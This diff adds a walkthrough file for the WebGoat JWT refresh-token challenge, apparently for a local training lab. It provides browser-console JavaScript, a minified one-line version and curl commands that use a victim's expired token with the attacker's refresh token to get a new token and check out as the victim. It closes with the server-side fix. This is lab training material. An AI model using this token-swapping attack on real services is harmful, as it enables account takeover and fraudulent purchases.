@@ -1,0 +1,291 @@
+========================================================
+JWT REFRESH TOKEN MANIPULATION - CONSOLE ATTACK
+Challenge: Make Tom pay for the books
+========================================================
+
+PASTE THIS IN BROWSER CONSOLE (F12) ON WEBGOAT PAGE
+Location: http://192.168.254.112:8001/WebGoat/JWT
+
+========================================================
+ATTACK EXPLANATION
+========================================================
+
+From Mikail's Bug Bounty Report:
+- Authorization Server doesn't check refresh_token <-> access_token association
+- Attacker can refresh SOMEONE ELSE'S access token using THEIR refresh token
+- Impact: Get valid token for victim even from old/expired tokens
+
+Attack Flow:
+1. Tom's expired token from log → Contains user='Tom'
+2. Our valid refresh token → Belongs to us
+3. Server validates refresh token ✓ (doesn't check ownership)
+4. Server issues NEW token for Tom (from expired access token)!
+5. We checkout as Tom → Tom pays! 💰
+
+========================================================
+STEP 1: SETUP VARIABLES
+========================================================
+
+// Tom's expired token from the access log
+const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
+
+// Decode JWT helper function
+function decodeJWT(token) {
+    const parts = token.split('.');
+    const payload = parts[1];
+    const decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
+    return JSON.parse(decoded);
+}
+
+// Display Tom's expired token
+console.log('%c[1] Tom\'s Expired Token from Log', 'color: cyan; font-size: 16px; font-weight: bold');
+console.log('Token:', TOMS_EXPIRED_TOKEN);
+console.log('Decoded:', decodeJWT(TOMS_EXPIRED_TOKEN));
+console.log('Status: EXPIRED ❌');
+
+========================================================
+STEP 2: LOGIN AND GET YOUR REFRESH TOKEN
+========================================================
+
+// Login to get YOUR refresh token
+fetch('/WebGoat/login', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        username: 'webgoat',
+        password: 'webgoat'
+    })
+})
+.then(r => r.json())
+.then(data => {
+    window.myRefreshToken = data.refresh_token;
+    window.myAccessToken = data.access_token;
+    
+    console.log('%c[2] ✅ Login Successful', 'color: green; font-size: 16px; font-weight: bold');
+    console.log('Your Access Token:', data.access_token);
+    console.log('Your Refresh Token:', data.refresh_token);
+    console.log('Decoded Your Token:', decodeJWT(data.access_token));
+    console.log('\n%cNow run STEP 3 to execute the attack!', 'color: yellow; font-size: 14px');
+})
+.catch(err => {
+    console.error('❌ Login failed:', err);
+});
+
+========================================================
+STEP 3: EXECUTE THE ATTACK (Run after Step 2 completes)
+========================================================
+
+// THE ATTACK: Use Tom's expired token + YOUR refresh token
+fetch('/WebGoat/JWT/refresh/newToken', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,  // ← Tom's expired token
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        refresh_token: window.myRefreshToken  // ← YOUR refresh token
+    })
+})
+.then(r => r.json())
+.then(data => {
+    window.tomsNewToken = data.access_token;
+    
+    console.log('%c[3] ⚡ ATTACK SUCCESSFUL!', 'color: red; font-size: 16px; font-weight: bold');
+    console.log('Tom\'s NEW Valid Token:', data.access_token);
+    console.log('Decoded:', decodeJWT(data.access_token));
+    console.log('User in token:', decodeJWT(data.access_token).user, '← We can act as Tom!');
+    console.log('\n%cNow run STEP 4 to checkout as Tom!', 'color: yellow; font-size: 14px');
+})
+.catch(err => {
+    console.error('❌ Attack failed:', err);
+    console.log('Make sure you ran STEP 2 first and have window.myRefreshToken set');
+});
+
+========================================================
+STEP 4: CHECKOUT AS TOM (Run after Step 3 completes)
+========================================================
+
+// Checkout with Tom's new token → Tom pays!
+fetch('/WebGoat/JWT/refresh/checkout', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Bearer ' + window.tomsNewToken,
+        'Content-Type': 'application/json'
+    }
+})
+.then(r => r.json())
+.then(data => {
+    console.log('%c[4] 🎉 SUCCESS! Tom paid for the books!', 'color: green; font-size: 18px; font-weight: bold');
+    console.log('Response:', data);
+})
+.catch(err => {
+    console.error('❌ Checkout failed:', err);
+});
+
+========================================================
+ALL-IN-ONE AUTOMATED ATTACK (Copy/Paste Everything Below)
+========================================================
+
+(async function() {
+    console.clear();
+    console.log('%c═══════════════════════════════════════════════════════', 'color: cyan; font-size: 14px');
+    console.log('%c    JWT REFRESH TOKEN MANIPULATION ATTACK', 'color: yellow; font-size: 18px; font-weight: bold');
+    console.log('%c    Challenge: Make Tom pay for the books', 'color: cyan; font-size: 14px');
+    console.log('%c═══════════════════════════════════════════════════════', 'color: cyan; font-size: 14px');
+    
+    // Tom's expired token from log
+    const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
+    
+    // Helper function
+    function decodeJWT(token) {
+        const parts = token.split('.');
+        const payload = parts[1];
+        const decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
+        return JSON.parse(decoded);
+    }
+    
+    // Step 1: Show Tom's token
+    console.log('\n%c[STEP 1] Tom\'s Expired Token from Log', 'color: cyan; font-size: 16px; font-weight: bold');
+    const tomPayload = decodeJWT(TOMS_EXPIRED_TOKEN);
+    console.log('User:', tomPayload.user);
+    console.log('Expired:', new Date(tomPayload.exp * 1000).toLocaleString());
+    console.log('Status: ❌ EXPIRED');
+    
+    // Step 2: Login to get our refresh token
+    console.log('\n%c[STEP 2] Getting YOUR Refresh Token...', 'color: cyan; font-size: 16px; font-weight: bold');
+    
+    try {
+        const loginResp = await fetch('/WebGoat/login', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({username: 'webgoat', password: 'webgoat'})
+        });
+        
+        const loginData = await loginResp.json();
+        const myRefreshToken = loginData.refresh_token;
+        const myAccessToken = loginData.access_token;
+        
+        console.log('✅ Login successful');
+        console.log('Your user:', decodeJWT(myAccessToken).user);
+        console.log('Your refresh token:', myRefreshToken.substring(0, 30) + '...');
+        
+        // Step 3: Execute the attack
+        console.log('\n%c[STEP 3] ⚡ EXECUTING ATTACK...', 'color: red; font-size: 16px; font-weight: bold');
+        console.log('Sending:');
+        console.log('  Authorization: Bearer <Tom\'s expired token>');
+        console.log('  Body: { refresh_token: <YOUR refresh token> }');
+        
+        const attackResp = await fetch('/WebGoat/JWT/refresh/newToken', {
+            method: 'POST',
+            headers: {
+                'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({refresh_token: myRefreshToken})
+        });
+        
+        const attackData = await attackResp.json();
+        const tomsNewToken = attackData.access_token;
+        
+        console.log('%c✅ ATTACK SUCCESSFUL!', 'color: green; font-size: 16px; font-weight: bold');
+        console.log('Got NEW token for:', decodeJWT(tomsNewToken).user);
+        console.log('Tom\'s new token:', tomsNewToken);
+        
+        // Step 4: Checkout as Tom
+        console.log('\n%c[STEP 4] 🛒 Checking out as Tom...', 'color: cyan; font-size: 16px; font-weight: bold');
+        
+        const checkoutResp = await fetch('/WebGoat/JWT/refresh/checkout', {
+            method: 'POST',
+            headers: {
+                'Authorization': 'Bearer ' + tomsNewToken,
+                'Content-Type': 'application/json'
+            }
+        });
+        
+        const checkoutData = await checkoutResp.json();
+        
+        console.log('%c🎉 SUCCESS! TOM PAID FOR THE BOOKS! 💰', 'color: green; font-size: 18px; font-weight: bold');
+        console.log('Response:', checkoutData);
+        
+        console.log('\n%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
+        console.log('%c    CHALLENGE COMPLETE!', 'color: yellow; font-size: 18px; font-weight: bold');
+        console.log('%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
+        
+        console.log('\n%cVulnerability Explained:', 'color: orange; font-size: 14px; font-weight: bold');
+        console.log('The server validated YOUR refresh token but didn\'t check');
+        console.log('if it belonged to the user in Tom\'s expired access token.');
+        console.log('This allowed us to get a NEW valid token for Tom!');
+        
+    } catch (error) {
+        console.error('%c❌ ERROR:', 'color: red; font-size: 16px; font-weight: bold', error);
+        console.log('Make sure you are on the WebGoat JWT page:');
+        console.log('http://192.168.254.112:8001/WebGoat/JWT');
+    }
+})();
+
+========================================================
+QUICK COPY VERSION (Minified - Copy everything below)
+========================================================
+*/
+
+(async function(){console.clear();const T='eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';const d=t=>JSON.parse(atob(t.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));console.log('%c[1] Tom expired token - user: '+d(T).user,'color:cyan;font-size:14px');const l=await(await fetch('/WebGoat/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'webgoat',password:'webgoat'})})).json();console.log('%c[2] Got refresh token','color:green;font-size:14px');const a=await(await fetch('/WebGoat/JWT/refresh/newToken',{method:'POST',headers:{'Authorization':'Bearer '+T,'Content-Type':'application/json'},body:JSON.stringify({refresh_token:l.refresh_token})})).json();console.log('%c[3] ⚡ Got Tom new token - user: '+d(a.access_token).user,'color:red;font-size:14px');const c=await(await fetch('/WebGoat/JWT/refresh/checkout',{method:'POST',headers:{'Authorization':'Bearer '+a.access_token,'Content-Type':'application/json'}})).json();console.log('%c[4] 🎉 SUCCESS! Tom paid!','color:green;font-size:18px;font-weight:bold');console.log(c);})();
+
+========================================================
+TROUBLESHOOTING
+========================================================
+
+Error: "Failed to fetch" or CORS error
+→ Make sure you're on the WebGoat page itself:
+  http://192.168.254.112:8001/WebGoat/JWT
+→ Don't run from file:// or different origin
+
+Error: "window.myRefreshToken is not defined"
+→ You need to run STEP 2 first and wait for it to complete
+→ Or use the ALL-IN-ONE version (uses await)
+
+Error: 401 Unauthorized
+→ The refresh token might be expired
+→ Run STEP 2 again to get a fresh refresh token
+
+Error: Token doesn't have "user" field
+→ Check the decoded payload structure
+→ It might use "username" instead of "user"
+
+========================================================
+MANUAL TESTING
+========================================================
+
+If you want to test manually with curl/PowerShell:
+
+1. Get your refresh token:
+curl -X POST http://192.168.254.112:8001/WebGoat/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"webgoat","password":"webgoat"}'
+
+2. Use Tom's expired token + your refresh token:
+curl -X POST http://192.168.254.112:8001/WebGoat/JWT/refresh/newToken \
+  -H "Authorization: Bearer eyJhbGci..." \
+  -H "Content-Type: application/json" \
+  -d '{"refresh_token":"YOUR_REFRESH_TOKEN"}'
+
+3. Checkout with Tom's new token:
+curl -X POST http://192.168.254.112:8001/WebGoat/JWT/refresh/checkout \
+  -H "Authorization: Bearer TOM_NEW_TOKEN" \
+  -H "Content-Type: application/json"
+
+========================================================
+KEY TAKEAWAY
+========================================================
+
+Vulnerability: Authorization server doesn't validate that
+the refresh token belongs to the user in the access token.
+
+Fix: Server must check:
+  access_token.user === refresh_token.user
+
+This prevents an attacker from refreshing someone else's
+token using their own refresh token.
+
+Reference: https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/
+
+========================================================
